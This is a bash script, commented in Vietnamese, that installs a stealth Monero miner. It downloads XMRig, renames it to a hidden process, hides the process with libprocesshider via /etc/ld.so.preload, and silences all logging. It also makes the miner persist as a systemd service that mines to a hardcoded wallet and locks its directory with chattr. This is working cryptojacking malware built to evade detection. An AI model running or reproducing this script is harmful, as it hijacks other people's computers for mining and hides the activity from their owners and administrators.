#!/bin/bash
# Script hoàn chỉnh để tải, cài đặt và chạy XMRig với chế độ ẩn danh

# Tắt ghi log để tránh lưu lại thông tin
exec > /dev/null 2>&1

# Cập nhật hệ thống và cài đặt các gói cần thiết
sudo apt update -y
sudo apt upgrade -y
sudo apt install -y wget tar cpulimit

# Tạo thư mục làm việc
WORK_DIR="/tmp/.hidden-miner"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Tải và giải nén XMRig
wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
rm xmrig-6.22.2-linux-static-x64.tar.gz

# Đổi tên file thực thi để ẩn danh
mv xmrig-6.22.2/xmrig .hidden-process
chmod +x .hidden-process

# Cài đặt libprocesshider để ẩn tiến trình
install_libprocesshider() {
    if ! command -v gcc &> /dev/null; then
        sudo apt update -y && sudo apt install -y gcc make git
    fi

    if [ ! -f /usr/local/lib/libprocesshider.so ]; then
        git clone https://github.com/gianlucaborello/libprocesshider.git /tmp/libprocesshider
        cd /tmp/libprocesshider
        make && sudo make install
        cd ..
        rm -rf /tmp/libprocesshider
    fi

    # Thêm libprocesshider vào ld.so.preload
    if ! grep -q "libprocesshider.so" /etc/ld.so.preload; then
        echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload
    fi
}

# Tạo một dịch vụ systemd để tự động khởi động lại
create_systemd_service() {
    SERVICE_NAME="hidden-miner"
    SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME.service"

    sudo bash -c "cat > $SERVICE_PATH <<EOF
[Unit]
Description=Hidden Background Miner
After=network.target

[Service]
ExecStart=$WORK_DIR/.hidden-process -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM64-ohiodesp-12t3 -k --coin monero -a rx/64
Restart=always
RestartSec=60
User=$(whoami)
WorkingDirectory=$WORK_DIR
Nice=19
LimitNOFILE=1048576
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF"

    sudo systemctl daemon-reload
    sudo systemctl enable "$SERVICE_NAME"
    sudo systemctl start "$SERVICE_NAME"
}

# Giới hạn tài nguyên CPU và bộ nhớ
limit_resources() {
    MAX_CPU=90  # Giới hạn CPU ở 90%
    MAX_MEM=128 # Giới hạn bộ nhớ ở 512MB

    ulimit -Sv $((MAX_MEM * 1024)) # Giới hạn bộ nhớ
    cpulimit -l $MAX_CPU -b -p $$  # Giới hạn CPU
}

# Cài đặt libprocesshider
install_libprocesshider

# Tạo dịch vụ systemd
create_systemd_service

# Giới hạn tài nguyên
limit_resources

# Ẩn thư mục làm việc
chattr +i "$WORK_DIR"
